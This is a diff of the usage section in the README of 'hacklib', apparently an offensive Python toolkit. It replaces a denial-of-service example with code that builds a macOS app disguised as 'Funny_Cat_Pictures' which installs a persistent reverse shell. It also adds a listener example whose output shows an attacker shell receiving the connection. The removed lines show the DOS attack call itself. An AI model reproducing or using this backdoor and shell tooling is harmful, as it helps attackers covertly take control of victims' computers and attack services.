@@ -41,13 +41,29 @@ hacklib.installDependencies()
 ```
 -
 #### Usage Examples
-Multi-threaded Denial of Service (DOS) stress-testing:
+Reverse shell backdooring (Currently only for Macs):
 ```python
 import hacklib
 
-dos = hacklib.DOSer()
-# Create 50 threads to send GET requests for 30 seconds
-dos.launch('127.0.0.1', duration=30, threads=50)
+bd = hacklib.Backdoor()
+# Generates an app that drops a persistent reverse shell into the system.
+bd.create('127.0.0.1', 9090, 'OSX', 'Funny_Cat_Pictures')
+# Takes the IP and port of the command server, the OS of the target, and the name of the .app
+```
+-
+
+Shell listener (Use in conjunction with the backdoor):
+```python
+import hacklib
+# Create instance of Server with the listening port
+>>> s = hacklib.Server(9090)
+>>> s.listen()
+New connection ('127.0.0.1', 51101)
+bash: no job control in this shell
+bash-3.2$ whoami
+leon
+bash-3.2$ 
+# Sweet!
 ```
 -
 Universal login client for almost all HTTP/HTTPS form-based logins and HTTP Basic Authentication logins:
